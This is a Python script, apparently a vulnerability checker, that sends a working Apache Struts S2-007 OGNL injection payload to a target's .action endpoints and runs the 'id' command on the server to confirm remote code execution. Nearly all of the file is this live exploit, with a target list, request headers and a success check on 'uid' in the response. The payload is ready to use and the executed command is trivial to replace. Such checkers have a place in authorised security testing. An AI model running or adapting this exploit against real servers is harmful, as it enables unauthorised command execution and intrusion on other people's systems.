
try:
    import requests,sys,os,logging,queue

except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, ip,port):
        self.url = 'http://' + ip +":"+port
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/user.action']
        self.queues = queue.Queue(len(dirs))
        self.ip = ip
        if '://' not in ip:
            for dir in dirs:
                urls = 'http://' + ip +":"+port + dir
                self.queues.put(urls)

    def Test(self):
            
        headers={
                "Content-Length": '''353''',
                "Cache-Control": '''max-age=0''',
                "sec-ch-ua": '''" Not A;Brand";v="99", "Chromium";v="96"''',
                "sec-ch-ua-mobile": '''?0''',
                "sec-ch-ua-platform": '''"Linux"''',
                "Upgrade-Insecure-Requests": '''1''',
                "Origin": '''http://127.0.0.1:8080''',
                "Content-Type": '''application/x-www-form-urlencoded''',
                "User-Agent": '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36''',
                "Accept": '''text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9''',
                "Sec-Fetch-Site": '''same-origin''',
                "Sec-Fetch-Mode": '''navigate''',
                "Sec-Fetch-User": '''?1''',
                "Sec-Fetch-Dest": '''document''',
                "Referer": self.ip+'''/''',
                "Accept-Encoding": '''gzip, deflate''',
                "Accept-Language": '''zh-CN,zh;q=0.9''',
                "Cookie": '''JSESSIONID=9CD5BBA847E428B2C9CA03CAA56B6767''',
                "Connection": '''close'''
                }
        data = '''name=&email=&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27'''
        while not self.queues.empty():
            url = self.queues.get(False)
            try:   
                req = requests.get(url,timeout=3)

                req = requests.post(url, data=data, headers=headers,timeout=3)
                if ('uid' in req.text):
                    logging.info( '[+] Found S2-007 in ' + self.ip)
                    os._exit(1)
            
            except Exception as e:
                pass
        logging.info( '[-] S2-007 Not Found in ' + self.ip)
        os._exit(2)

if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(ip,port)
    test.Test()
    

